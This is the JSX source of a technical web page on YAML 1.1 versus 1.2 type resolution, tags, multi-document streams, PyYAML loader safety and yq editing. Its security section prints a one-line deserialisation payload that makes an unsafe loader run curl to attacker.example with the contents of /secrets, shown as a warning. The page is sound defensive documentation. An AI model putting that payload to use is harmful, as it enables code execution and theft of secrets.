          Syntactically 1.2 is mostly a superset of 1.1 and adds JSON compatibility, but resolution is not a superset relation — which is why teams arguing about YAML versions are arguing about behaviour, not grammar. These are the disagreements that produce observable data differences, all taken from the 1.1 type repository and the 1.2 core schema table.
        </P>
        <DataTable
          caption="Resolution differences between YAML 1.1 and the YAML 1.2 core schema"
          head={['Input', 'YAML 1.1 result', 'YAML 1.2 core result', 'Practical consequence']}
          rows={[
            ['NO / no / N / n', 'boolean false', 'string', 'Country codes and survey answers silently flip type.'],
            ['YES / Y / on / ON', 'boolean true', 'string', 'Feature flags named with yes/no parse differently.'],
            ['~ and empty', 'null', 'null', 'Agreement — both are null, so do not rely on absence.'],
            ['017', 'integer 15, octal', 'not a valid integer form', 'File modes and part numbers with leading zeros.'],
            ['0o17', 'not an integer form', 'integer 15', 'The 1.2 spelling is not legal 1.1.'],
            ['12:30', 'integer 750, base 60', 'string', 'Times and durations become numbers.'],
            ['1:30:45', 'integer 5445', 'string', 'Same mechanism, longer value.'],
            ['1_000', 'integer 1000', 'string', 'Readable digit separators are 1.1-only.'],
            ['2001-12-14', 'timestamp', 'string', 'The 1.2 schemas define no timestamp type, so bare dates are text.'],
            ['2001-12-14 21:59:43.10 -5', 'timestamp, relaxed form', 'string', 'Same reason: the pattern only exists in the 1.1 type repository.'],
            ['+12', 'integer 12', 'integer 12', 'Agreement, but JSON forbids the leading plus.'],
            ['.inf, .nan', 'float', 'float', 'Agreement; NaN comparisons still break equality.'],
            ['merge key <<', 'defined type tag:yaml.org,2002:merge', 'not defined by any 1.2 schema', 'Same file, two trees, depending on the library.'],
            ['non-ASCII line separators', 'restricted / warned', 'normalised or error per 6.3', 'A U+2028 inside a block scalar is a portability problem.'],
          ]}
          foot="libyaml and PyYAML implement 1.1 semantics, as Ansible states in its own documentation; go-yaml v2 is 1.1 and v3 targets 1.2; js-yaml implements 1.1 with a 1.2 core schema available. Assume mixed until your lockfile says otherwise."
        />
        <P>
          The rule that follows from the table is small and absolute: the portable subset of YAML is the intersection of the two resolvers plus explicit quoting, and every row in which the middle two columns disagree is a value whose type you do not control. Why 1.1 is still everywhere is worth knowing: it was never formally standardised — each of its type-repository pages describes itself as a draft reflecting consensus reached on the yaml-core mailing list — and yet it is the semantics of the two C and Python reference implementations that nearly every later library was written against. When someone tells you their tool is 1.2 compliant, ask what it does with <Rich text="`0755`" />.
        </P>
        <H3>Tags: the types 1.2 left out</H3>
        <P>
          Tags are how YAML says what a node is, and they are the second axis on which two conforming readers disagree. A global tag is a URI, the <Rich text="`!!`" /> shorthand expands to <Rich text="`tag:yaml.org,2002:`" /> under the core schema, and the <Rich text="`%TAG`" /> directive can rebind handles; a local tag — a single exclamation mark followed by a name — is a private label the language deliberately leaves undefined, and it is where every language-specific object system lives. Chapter 10.4 names <Rich text="`!ruby/object:Set`" /> as the example and says such tags do not suffice for interoperable exchange. Across editions what matters is that the 1.2 recommended schemas define far fewer global tags than the 1.1 repository does.
        </P>
        <P>
          Timestamps are the least obvious case, because nothing announces them. The 1.1 type repository defines <Rich text="`!!timestamp`" /> with a pattern accepting the canonical <Rich text="`2001-12-14T21:59:43.10-05:00`" />, the same value with a lower-case t, the space-separated relaxed form, and the date-only form; the three recommended 1.2 schemas define no timestamp type at all. So an unquoted date is a string under a 1.2 core resolver, a datetime object under PyYAML that dumps back as ISO text with a time zone appended, and exactly the characters you typed under a strict 1.2 library. All three are conforming. <Rich text="`!!binary`" /> carries the same asymmetry, as do the collection types <Rich text="`!!set`" />, <Rich text="`!!omap`" /> and <Rich text="`!!pairs`" />, which appear in the specification’s own introductory examples and in none of its resolution tables.
        </P>
        <DataTable
          caption="Tags you will actually meet in configuration files"
          head={['Tag', 'Content', 'Notes']}
          rows={[
            ['!!str', 'any text', 'The escape hatch for dates, versions, and country codes.'],
            ['!!int', 'decimal, 0x, 0o, or 1.1 forms', 'Arbitrarily large in the type repository, which asks processors to round-trip what does not fit.'],
            ['!!float', 'decimal, exponent, .inf, .nan', 'NaN breaks equality testing; two NaN keys are not the same key.'],
            ['!!bool', 'true/false in 1.2; 24 forms in 1.1', 'Only ever write the 1.2 spellings.'],
            ['!!null', 'null, Null, NULL, ~, empty', 'There are five ways to write nothing.'],
            ['!!timestamp', 'a point in time, defined only in 1.1', 'No 1.2 recommended schema resolves to it, so a bare date is a string there and a date object here.'],
            ['!!binary', 'base64, whitespace-insensitive', 'Decoded into bytes, so a YAML document can carry an image inline.'],
            ['!!merge', 'the << key', 'A 1.1 working draft type, absent from 1.2 schemas.'],
            ['!local', 'whatever your tool decides', 'The dangerous one; see the security section.'],
          ]}
          foot="The binary type example in the specification is a GIF written as wrapped base64. The specification also flags the general hazard in its own text on tag resolution: application-specific rules are supposed to be restricted to resolving the non-specific tag on plain scalars, which is a polite way of saying that any library may invent a date type your library does not have."
        />
        <CodeBlock
          title="four ways to write the same date, three different results"
          language="yaml"
          code={`a: 2024-01-15
b: !!str 2024-01-15
c: "2024-01-15"
d: 2024-01-15T09:30:00Z
e: 2024-01-15 09:30:00      # the relaxed form from the 1.1 type repository`}
          caption="b and c are strings in every schema. Under a 1.2 core resolver a, d and e are also strings; under a 1.1 implementation a, d and e are timestamp objects that serialise differently. If your data model has a string column, the second answer is the bug."
        />
        <H3>Finding out which resolver you actually run</H3>
        <P>
          Ask the runtime, not the documentation. Write a probe file with five keys whose values are <Rich text="`NO`" />, <Rich text="`0755`" />, <Rich text="`12:30`" />, <Rich text="`1_000`" /> and <Rich text="`1.10`" />, parse it with the exact library and version pinned in your lockfile or base image, and emit the resolved nodes with their types attached. A 1.1 resolver hands back false, 493, 750, 1000 and 1.1; a 1.2 core resolver hands back the four strings and one float. If you cannot tell which answer you got, you do not know what your deployed configuration contains, only what its file looks like. Two situations produce a mixture inside one pipeline: a template renderer that quotes some fields and leaves others bare, and a process that reads the same file with two libraries. Run the probe through both.
        </P>
      </Section>

      <Section id="dialects-and-toolchains" title="Four dialects, and how tools drop documents" kicker="YAML in the wild">
        <P>
          YAML the language is small; the ecosystem is four dialects that share a syntax and layer typing and structural rules on top differently enough that a file valid in one is wrong in another. Kubernetes is JSON-based: its object documentation states that an API request must carry the object information as JSON in the request body, that manifests are conventionally YAML, and that tools such as kubectl convert the manifest into JSON when making the request. That architecture explains both failure modes everyone meets. Every value the resolver mistyped becomes a type error from the API server, because the JSON it receives holds a string where the Go struct wants an int64, and every field name in a manifest is really a JSON key, with naming, case and merge semantics defined by the API rather than by YAML. A quantity such as <Rich text="`memory: 1Gi`" /> is a string the API parses; a replicas field of <Rich text="`002`" /> may not be.
        </P>
        <P>
          GitHub Actions constrains the file rather than the values: a workflow must have a <Rich text="`.yml`" /> or <Rich text="`.yaml`" /> extension and live in <Rich text="`.github/workflows`" />, and its syntax documentation makes quoting a requirement in specific places rather than advice, because an asterisk, an opening bracket and an exclamation mark are special in YAML — it gives an invalid branches pattern in brackets that creates a parse error preventing the workflow from running at all. Ansible states that nearly every one of its files is a list of hashes and, on the same page, that PyYAML and libyaml currently implement YAML 1.1; its gotchas list is the best short inventory of production YAML hazards anywhere. Docker Compose follows the merge type for overrides, and its dollar-brace variable interpolation is not a YAML feature but something Compose does before or alongside parsing, which is why a literal interpolation sequence has to be doubled. None of them changed the syntax, which is exactly the trap: a file that parses cleanly in a plain YAML parser can still be wrong for the tool that consumes it, and a linter that only checks YAML will never tell you so. The specification covers syntax and resolution; the tool covers meaning.
        </P>
        <CodeBlock
          title="the same shape in three dialects"
          language="yaml"
          code={`# Kubernetes: values become API field types after conversion to JSON
spec:
  replicas: 3
  template:
    spec:
      containers:
        - name: app
          image: registry.example.com/app:1.10

# GitHub Actions: patterns must be quoted when they start with a special char
on:
  push:
    branches: ["release/v[0-9].[0-9]"]

# Compose: fragments and merge keys
x-common: &common
  restart: always
services:
  web:
    <<: *common
    image: app:1.10`}
          caption="Notice the version string in the image tag: in all three dialects that is a string, because the value contains characters no resolver matches. It is the version in a bare field that is a float."
        />
        <H3>The stream is the unit, and most entry points read one document</H3>
        <P>
          Every parser must decide whether its ordinary entry point exposes the whole stream or exactly one document; where the answer is one document, everything after it becomes the caller’s problem. The dangerous case is not an error; it is the loader that stops at the document boundary without saying so, so a three-object bundle becomes a one-object deploy. Python names the split: <Rich text="`yaml.load`" /> takes a document while <Rich text="`yaml.load_all`" />, <Rich text="`yaml.safe_load_all`" /> and <Rich text="`yaml.compose_all`" /> are the documented stream-level calls. <Rich text="`js-yaml`" /> has the same shape in <Rich text="`loadAll`" />. Go is where it stops being a naming convention and becomes a bug class: the README for <Rich text="`gopkg.in/yaml.v3`" /> states that multi-document unmarshalling is not implemented, so one <Rich text="`Unmarshal`" /> call on a file holding a ConfigMap, a Deployment and a Service decodes the ConfigMap, and the decoded value carries no evidence that the stream continued.
        </P>
        <DataTable
          caption="What each documented entry point does with a three-document stream"
          head={['Call', 'Language', 'What it gives you', 'The trap']}
          rows={[
            ['yaml.load', 'Python', 'one document', 'the single-document default; use a load_all form for streams'],
            ['yaml.safe_load_all', 'Python', 'one result per document', 'nothing, if you actually iterate it'],
            ['yaml.compose_all', 'Python', 'one root node per document, before tag resolution', 'the right call when you only need to count or inspect nodes'],
            ['load', 'js-yaml', 'one document', 'the same default, another language'],
            ['loadAll', 'js-yaml', 'every document: iterator per document, or an array', 'the array form is what reveals a missing separator'],
            ['Unmarshal', 'Go, yaml.v3', 'the first document only', 'multi-document unmarshalling is documented as not implemented'],
            ['eval-all mode', 'yq', 'one expression applied across every document', 'outside eval-all, expressions run per document'],
          ]}
          foot="Three languages and one CLI, and the single-document call is the default in all of them. Whether the remainder of the stream is an error or simply never read is a property of the library, not of YAML — which is exactly why the count has to come from somewhere else."
        />
        <P>
          The mirror-image failure happens in the writing direction and needs no exotic parser. Concatenate two YAML files with no separator and you do not get two documents: you get one document whose mapping holds the keys of both, with duplicate keys wherever the fragments share a name. Whether that is reported depends on the implementation, and where it is not checked the last value wins. An empty document is legal too, so a stream whose final separator is followed by nothing, or only by a comment, contains a document with no root content; read through a stream API it arrives as a null rather than a mapping, and the loop that indexes the kind field of every document is where that surfaces.
        </P>
        <Callout tone="warn" title="How to tell whether your tool drops documents">
          <P>
            Do not trust a clean exit code; ask for a count. Parse with the stream-level API in your language, collect the documents, print how many there were, and compare that with the number of objects you expected to deploy. A tool that cannot report a document count is a tool whose idea of a valid file is its first document.
          </P>
        </Callout>
      </Section>

      <Section id="security-and-editing" title="Parsing safely, editing honestly" kicker="Handling other people's YAML">
        <P>
          YAML security is not the format doing anything clever. A tag is a label that tells a processor how to construct a value, and language-specific implementations let that label name a class in their own runtime. PyYAML documents this directly: <Rich text="`yaml.load`" /> is unsafe in the same way as pickle, because a document can construct arbitrary Python objects, and the recommended function for input you do not trust is <Rich text="`yaml.safe_load`" />, which resolves only the plain types.
        </P>
        <CodeBlock
          title="what an unsafe loader will build for you"
          language="yaml"
          code={`payload: !!python/object/apply:os.system ["curl http://attacker.example/$(cat /secrets)"]`}
          caption="One line. Under a loader that honours python/object tags, this is a function call, not a string. Do not put this in a file you intend to open with a default loader in any language."
        />
        <DataTable
          caption="PyYAML: what each entry point does, and the CVEs attached to it"
          head={['Call', 'Loader', 'Resolves', 'Record']}
          rows={[
            ['yaml.load(f)', 'Loader (unsafe)', 'python/object, python/apply and friends', 'CVE-2017-18342: before PyYAML 5.1, load could execute arbitrary code on untrusted data; load was deprecated in 5.1 and UnsafeLoader introduced for compatibility.'],
            ['yaml.load(f, Loader=yaml.SafeLoader)', 'SafeLoader', 'plain types only', 'The documented recommendation for untrusted input.'],
            ['yaml.full_load(f) / FullLoader', 'FullLoader', 'plain types plus a restricted set of Python objects', 'CVE-2020-14343: before PyYAML 5.4, full_load and FullLoader were still exploitable by abusing the python/object/new constructor; the record calls it an incomplete fix of CVE-2020-1747.'],
            ['yaml.safe_load(f)', 'SafeLoader', 'plain types only', 'Default choice for configuration you did not generate.'],
          ]}
          foot="Note the pattern: the fix for the 2017 issue was a middle loader, and the middle loader was itself bypassed in 2020. If you parse YAML from outside your trust boundary, parse it with the plain-types loader and validate the result."
        />
        <P>
          A configuration format that can name a class in your runtime is a code-execution surface, whatever it calls itself. Other ecosystems solved this structurally rather than by documentation: <Rich text="`js-yaml`" /> ships safe loaders as the default, most Go and Rust libraries have no object tag at all and simply fail on unknown tags, and the .NET world depends on which stream and resolver you register. The portable answer is that a tag must never resolve to something your application can execute, and a tool that offers a full or unsafe mode should be treated as you would <Rich text="`eval`" />.
        </P>
        <H3>Querying and editing without rewriting the file</H3>
        <P>
          Once a document resolves it is a graph of nodes, and there are two things people want to do with a graph: reach a node without reading the file by eye, and change one node without disturbing any other. The specification provides neither — no path syntax, no query language, no patch format — so everything from here on is ecosystem behaviour. The tool that stays inside the format is <Rich text="`yq`" />, whose README describes a portable command-line processor for YAML, JSON, XML, CSV, TOML, HCL and properties files with jq-like path expressions such as <Rich text="`.a.b[0].c`" /> and <Rich text="`select`" />, so expressions people already wrote against JSON keep working when the input is YAML. Two documented behaviours decide most uses: an in-place mode edits the file rather than printing to standard output, and eval-all is the multi-document case of the previous section expressed as a query.
        </P>
        <CodeBlock
          title="the three commands that cover most config edits"
          language="text"
          code={`# read one value out of one document
yq ".metadata.name" manifest.yaml

# change it in place, leaving the rest of the file alone
yq -i ".spec.replicas = 3" manifest.yaml

# filter across every document in a generated bundle
yq -e "select(.kind == \"Service\") | .metadata.name" bundle.yaml`}
          caption="A query, an edit, and the stream case: without eval-all the expression is evaluated per document, which is the right default but not a join across the bundle."
        />
        <P>
          The portable alternative is to leave YAML behind and use the query tools built for JSON. For reading that is often the fastest route, but the conversion is one-way, because much of what you want to know lives in the text layer and is not representable in JSON at all. You can inspect a configuration this way and move data this way, but you cannot write the answer back into the file you started from and expect it to be recognised in review.
        </P>
        <P>
          The difference between the two levels decides your diff. A native dictionary has no place for the comment above a key, the block-versus-flow choice, the quoting style of a scalar, the anchor name, or the chomping indicator that decided whether a script literal ends in a newline — so no tool that only ever saw the data model can preserve any of them. A one-value change therefore arrives in review as a rewrite of the whole file: comment blocks moved, flow sequences expanded, quoting changed wherever the writer disagreed with the author, and ownership routing keyed on changed lines notifies every owner instead of the one person who should have read it. Line-preserving editing is the unglamorous fix — change the node, keep the text.
        </P>
        <P>
          Re-emitting a file is also a decision about quoting: an emitter that drops quotes a human thought unnecessary hands the value back to the float pattern, so a diff whose only visible change is quoting may be a type change with no other evidence in the file.
        </P>
        <DataTable
          caption="What survives each operation on a file with comments, anchors and quoting choices"
          head={['Operation', 'Data model intact', 'Text layer intact', 'Usable as a commit']}
          rows={[
            ['query with a path expression', 'yes', 'yes, the file was never opened for writing', 'read-only, nothing to commit'],
            ['in-place edit of the document model', 'yes', 'yes, outside the node you changed', 'yes, usually a one-line diff'],
            ['load to native values, then dump', 'yes', 'no', 'only if the reviewer enjoys re-reading the file'],
            ['convert to JSON and back', 'mostly', 'no', 'no, and non-string keys are already gone'],
            ['concatenate two files, then reformat', 'depends on the separators', 'no', 'never'],
          ]}
          foot="Row two is the one to standardise on. Rows three and four are rewrites dressed as edits, and the diff will tell you so if you read it."
        />
        <H3>The checklist</H3>
        <DataTable
          caption="Nine rules for YAML in shared code"
          head={['Rule', 'Reason it exists']}
          rows={[
            ['Quote every string, always, in generated files', 'Removes the resolver from the loop; a quoted scalar is !!str in both versions.'],
            ['Never indent with tabs', 'Section 6.1 forbids it, and the parse error does not name the character.'],
            ['Two spaces per level, enforced by the formatter', 'Consistency is not required by the spec; ambiguity is prevented by it.'],
            ['No trailing whitespace, no CRLF unless you mean it', 'Trailing space is content in a block scalar and changes indentation detection.'],
            ['Write 0o755 or "0755", never 0755 bare', 'Leading-zero octal is a 1.1 behaviour with a different 1.2 answer.'],
            ['Write "12:30" for a time', 'Base-60 integers exist in 1.1 and produce numbers out of clock values.'],
            ['Anchor every reuse block in a dedicated x- section', 'Keeps graph tricks out of the diff and out of the payload.'],
            ['One logical document per file unless the format says otherwise', 'Streams are arrays of documents, not documents with lists.'],
            ['Parse untrusted YAML with plain-types loaders only', 'Tags that name runtime constructors are a code-execution surface.'],
          ]}
          foot="Rule 1 is the one that eliminates the other type-related rules for machine-written files; the rest matter when a human writes or edits the file. None of them requires a tool, a linter or an argument about which edition of the specification you believe in."
        />
        <P>
          Then audit the last file you changed, in three minutes. Read it for values rather than keys and mark every plain scalar that is not obviously a string. Below, nine are type decisions rather than data: the version, both modes, the schedule, the country flag, the two block scalars, the key with no value and the empty-looking token. Resolved with a 1.2 core schema you get a float for the version and strings for the modes, the schedule and the feature flags; resolved with 1.1 the same bytes give 493 and 412, a base-60 750 and a boolean. Neither answer is a bug in its parser: both followed their own schema, and the file you deployed is the resolved one, not the text.
        </P>
        <CodeBlock
          title="nine type decisions in fifteen lines"
          language="yaml"
          code={`service:
  name: billing
  version: 1.10
  port: 8080
  modes: [0755, 0644]
  schedule: 12:30
  features:
    - NO
    - SE
  banner: |
    Welcome to billing
    v1.10
  notes: >
    These lines will be folded
    into a single paragraph
  contact:
  env:
    TOKEN: `}
          caption="Nine values in this file are type decisions rather than data. Resolve it once per schema your team actually runs, and the file changes without a single character of it being edited."
        />
      </Section>

      <Section id="how-our-yaml-tools-handle-these-cases" title="How our YAML tools handle these cases" kicker="Product behaviour, in one place">
        <P>
          Everything above is the format. This section is what we build on top of it, and it is the only place on this page that makes a claim about our own tools.
        </P>
        <P>
          <Rich text="[YAML to JSON](/format-converters/yaml-to-json/)" /> parses with the YAML 1.2 core schema and reports the resolved type of every plain scalar together with what the same scalar would have resolved to under 1.1, marking the ones where the two disagree as high risk. It counts tab-indented lines separately and names the first offending line and column rather than emitting a generic bad indentation message, counts document separators in the raw text and states when a stream held more than one document and only the first was converted, and walks the node graph to report anchors, aliases, merge keys, flow collections and block scalars while building native values through the same document API with an explicit cap of one thousand alias expansions. That cap is a deliberate choice rather than a default, because the responsible behaviour in a browser tab is to refuse a file that would exhaust memory before you ever saw a report about it.
        </P>
        <P>
          <Rich text="[JSON to YAML](/format-converters/json-to-yaml/)" /> is the write path: it emits block-style YAML with consistent indentation, uses literal block scalars for multi-line strings, quotes any string whose plain form would resolve to a non-string under either resolver, and lists the values it protected and why — the fields in your schema that are identifiers wearing the clothes of numbers. For a manifest carrying a <Rich text="`!!binary`" /> scalar, the <Rich text="[Base64 decoder](/encoders-decoders/base64/)" /> is usually the second step, and both converters sit inside the <Rich text="[config conversion toolkit](/use-cases/config-conversion/)" />.
        </P>
      </Section>
    </>
  )
}
